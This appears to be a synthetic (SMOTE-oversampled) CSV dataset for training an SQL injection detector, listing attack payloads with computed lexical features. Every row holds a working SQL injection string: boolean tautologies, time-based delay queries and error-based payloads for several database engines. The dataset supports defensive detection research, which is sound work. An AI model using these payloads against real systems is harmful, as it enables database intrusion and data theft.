id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000429,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",nearest_attack_euclidean,R001318,0.2073343879452215,357.72645154757265,41.11360214781553,3.733236137915138,115.45440859126211,35.0,152.93123651286402,54.34080644344659,0.3228122421637905,0.09788230105789851,0.4273878239873889,0.15191763279092207,4.0,0.0,0.0,0.0,0.0,1.8863978521844709,0.0,32.454408591262116,0.0,1.9999999999999998,4.0,11.886397852184471,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000430,attack,boolean,"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000328,0.26775420845401016,235.65260690143077,37.88420230047692,3.800605196169339,71.88420230047691,26.76840460095385,94.0,43.0,0.3050426283190794,0.11358338363800242,0.39889894070098036,0.1824750473419378,0.0,1.0,2.0,0.0,0.0,1.0,0.0,22.0,1.0,1.9999999999999998,4.0,13.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.8842023004769244,0.11579769952307561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000431,attack,boolean,-4208%'   )    )     )   or 1133  =  9010--,nearest_attack_euclidean,R001420,0.2913366525051551,41.11645184055341,15.0,2.993424721136834,2.0,12.0,18.49316147244273,8.623290368110682,0.04881707241058336,0.29290243446350006,0.4485170786437999,0.20976341448211666,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.6232903681106823,1.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000432,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R001165,0.48813576416913895,69.77306464298763,23.0,3.5388551214911974,13.773064642987642,16.0,27.999999999999996,12.0,0.1971198913058188,0.22939431676976604,0.4014400543470906,0.17204573757732453,0.0,4.0,1.0,0.0,0.7423117856707868,2.0,0.0,4.0,0.0,0.0,0.2576882143292134,3.742311785670787,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,boolean,"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000243,0.010459413140470811,207.17332040763264,31.049520116466468,3.676262939455923,119.0,20.0,51.14856034939941,17.024760058233234,0.574413627511213,0.09654010546406942,0.2468714761735612,0.08217479085115637,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.024760058233235,0.0,0.0,6.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000434,attack,boolean,"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",nearest_attack_euclidean,R001500,0.644530652496105,51.640617397431356,19.213539132477116,3.4811177498005192,12.427078264954233,17.0,17.475692754984742,4.737846377492371,0.23789859372160066,0.33132078363936923,0.3391589693890584,0.09162165324997175,0.0,0.7378463774923716,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.7378463774923716,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,boolean,end and 'icny' like 'icny,nearest_attack_euclidean,R000853,0.9007414523696943,25.792020746619528,12.056027662159387,3.403402532456286,18.26400691553985,0.0,3.999999999999993,3.5280138310796936,0.7090625706419207,0.0,0.15547416716217408,0.13546326219590532,3.264006915539847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2640069155398468,0.0,0.0,-8.881784197001252e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7359930844601532,0.2640069155398468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000436,attack,boolean,"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000871,0.4863331761603035,264.92877728759777,33.767805678100544,3.7919211516512954,54.0,79.00000000000001,100.92877728759781,31.0,0.20383658449895012,0.2982053736188345,0.38094074337355893,0.11701729850865655,0.767805678100548,0.0,2.0,0.0,2.0,2.0,0.0,18.23219432189945,0.0,0.0,6.0,6.0,0.767805678100548,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000437,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001095,0.21903333452623314,133.1685090531118,31.600886359699143,3.6165344694892623,45.80265907909743,12.600886359699143,57.08425452655589,17.680709087759315,0.34438156059543135,0.0944911681775059,0.42767168342529005,0.13345558780177266,0.0,3.920177271939829,0.0,0.0,1.0,1.0,0.0,9.680709087759315,0.07982272806017138,1.0,1.0,1.9999999999999996,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9201772719398287
SMOTE_000438,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000531,0.008917810797130133,188.9532704997481,30.02803770015115,3.545437526967802,53.03738360020153,25.01869180010077,79.91588689954656,30.98130819989923,0.28069766977086036,0.13241031135626127,0.4229307851401671,0.16396123373271118,0.0,0.0,2.0,0.0,0.0,1.0,0.0,17.98130819989923,0.0,1.0,3.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000439,attack,boolean,"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001368,0.16639256022334198,62.750558823840066,18.75055882384007,3.198288158343359,8.75055882384006,13.0,27.999999999999996,13.0,0.13929369748342954,0.20720707282806325,0.44629215686044393,0.20720707282806322,0.0,4.0,0.0,0.0,0.08314705871997691,2.0,0.0,4.0,2.0,0.0,0.916852941280023,2.083147058719977,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",nearest_attack_euclidean,R000153,0.014551393991078755,143.1474523565203,33.995531746772116,4.0722287444274,63.040214279050986,10.026809519367323,47.06255554519042,23.01787301291155,0.44041883119212943,0.07002380950827737,0.32875139789438085,0.16080596140521236,0.0,3.0,0.0,0.0,0.0,0.0,0.0,10.017873012911549,0.0,1.9999999999999998,1.0134047596836622,5.9910634935442255,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9955317467721126,0.0,0.0,0.9955317467721126,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01340475968366217,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0044682532278877
SMOTE_000441,attack,boolean,"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",nearest_attack_euclidean,R000976,0.5304706839091268,82.42777588148249,22.66041595555593,3.190092125926431,14.66041595555593,14.213887940741238,40.0,13.55347198518531,0.17739286792994785,0.171668149791298,0.48641755586474367,0.16452142641401044,4.0,0.0,1.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,0.5534719851853097,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,boolean,"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000219,0.1364018211655678,221.54582513454415,33.9515275044848,3.47980239219225,55.04847249551519,24.145417486545586,102.64277012557454,39.70916502690883,0.24874622979390693,0.10918767388346863,0.4628493209417164,0.17921677538090808,0.0,4.0,0.0,0.0,0.0,2.0,0.0,21.709165026908828,2.0,1.0,3.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0484724955151954,0.9515275044848046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000443,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000931,0.47412081485139507,23.292492921534432,13.146246460767223,3.3546551671503506,2.0,12.0,6.0,3.2924929215344463,0.08593915505553235,0.5156349303331942,0.2578174651665971,0.1406084494446764,0.14624646076722336,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.14624646076722347,0.0,0.0,1.9999999999999996,0.14624646076722336,0.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000444,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000298,0.2063136231014158,20.215786593344788,10.143857728896531,2.9652320350731785,2.9280711355517326,9.215786593344797,6.0,2.071928864448264,0.14546535419782672,0.4551601141886799,0.29718539226072005,0.10218913935277331,0.0,1.0,0.07192886444826563,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0719288644482656,0.0,1.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9280711355517344,0.07192886444826563,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000445,attack,boolean,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",nearest_attack_euclidean,R000924,0.7559359634284532,161.84004226050834,36.7152916317348,4.12982052328775,63.0,18.0,56.985917155712755,23.854125104795592,0.39351713208489225,0.1124334663099692,0.34697318364696056,0.147076217958178,4.0,4.0,1.0,0.0,0.0,2.0,0.0,7.85412510479559,0.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000446,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000916,0.12311484716729017,130.6391126057172,33.0,3.7452996306857664,38.092741737144806,23.0,52.364247245714935,17.182123622857468,0.29133336241322005,0.1761768570985566,0.40095236710481585,0.13153741338340755,2.182123622857467,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000921,0.33914507204754707,139.2597124433317,32.466187065057355,4.107047724478008,69.13165472770075,8.73309353252868,42.72949652045886,18.665467662643394,0.4988420189954722,0.06297863122862507,0.30450994486745436,0.13366940490844836,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.199280597586037,1.0,0.0,2.733093532528679,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000448,attack,boolean,"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R000162,0.6325714206849226,292.7676048072508,34.846479038549845,3.810737390088515,63.38591615419939,77.77183230839879,113.60985634465257,38.0,0.2165439879313935,0.2657134617208574,0.3879419067274771,0.12980064362027202,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.614083845800607,0.0,0.0,6.0,7.385916154199393,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.8464790385498482,4.846479038549848,0.0,0.846479038549848,1.0,1.1535209614501518,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.846479038549848
SMOTE_000449,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000316,0.5125049431534213,99.24649953831482,28.246499538314822,3.4408705517767704,21.79719963065186,16.0,46.0,15.449299907662965,0.21926403612360357,0.16131554552122124,0.463782193373511,0.15563822498166416,4.0,0.0,1.0,0.0,0.0,1.0,0.0,8.0,0.0,0.4492999076629648,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000450,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000580,0.12961533146451745,124.0,28.0,4.1033917781822336,78.1603471003996,2.9999999999999982,30.005416771086047,12.834236128514341,0.6303253798419324,0.02419354838709678,0.24197916750875842,0.10350190426221242,3.0,0.0,0.0,0.0,1.0,0.0,0.0,3.834236128514341,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000451,attack,boolean,"-9557%""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000819,1.234171441034994,372.8174316403529,37.687899862731314,3.5703317140894066,93.4373667124229,46.687899862731314,165.75373205215894,66.93843301303974,0.25130809263685794,0.12533854527828892,0.44382959611114614,0.17952376597370703,0.0,4.0,0.562633287577105,0.0,0.0,3.0,0.0,33.37579972546263,2.0,3.0,0.0,23.562633287577107,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.437366712422895,0.562633287577105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000452,attack,boolean,"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl",nearest_attack_euclidean,R001200,0.7859855925001059,178.04460120952862,31.458600109957146,3.967762591484291,84.83440043982858,9.0,61.75160065974288,22.458600109957146,0.47658486352411,0.05059683931623027,0.34664474248471133,0.12617355467494837,0.0,4.0,0.0,0.0,1.0,1.5413998900428534,0.0,8.917200219914292,0.0,0.0,3.0,2.5413998900428534,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000453,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.22380061925334005,55.245163186197686,22.081721062065895,3.6889212266964218,24.0,4.081721062065894,18.0,9.163442124131787,0.43451914844239986,0.07382884190245562,0.3258893613317999,0.16576264832334456,0.24516318619768107,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,7.0,0.08172106206589358,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000454,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000246,0.13640999720644542,60.302117009847876,21.260423401969575,3.6388753243249616,13.0,16.0,21.041693607878294,10.260423401969573,0.2161809085905128,0.26606881057293885,0.34768302202600393,0.17006725881054438,0.0,4.0,1.0,0.0,1.0,2.0,0.0,2.2604234019695735,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000455,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R001332,0.0680233783507466,141.1417898651686,35.0,3.8781382382432046,51.0,10.0,53.95149155430717,26.190298310861433,0.36154928180810153,0.07089201604080424,0.3819874978735464,0.1855712042775478,3.0,0.0,0.0,0.0,0.0,1.0,0.0,11.190298310861433,1.0,1.9999999999999998,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000456,attack,boolean,"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",nearest_attack_euclidean,R000380,0.3409929923895598,87.5010545935829,22.800421837433156,3.1306067040919103,13.0,16.0,43.60084367486631,14.900210918716578,0.14904602801961686,0.18344126525491306,0.4973219123293935,0.17019079439607662,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.900210918716578,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000457,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",nearest_attack_euclidean,R000311,0.11983170390920583,117.55117468206095,27.0,3.912327318724301,63.0,5.0,30.758149727480806,18.793024954580133,0.5362602037087456,0.04256033362767825,0.26129818635536206,0.15988127630821414,3.0,0.0,0.0,0.0,1.0,1.0,0.0,3.793024954580134,1.0,5.0,4.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000458,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",nearest_attack_euclidean,R001347,0.11098176459517639,69.0,20.494376551627035,3.399805844323288,17.0,13.0,27.999999999999996,11.0,0.2463768115942029,0.18840579710144928,0.4057971014492754,0.15942028985507245,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
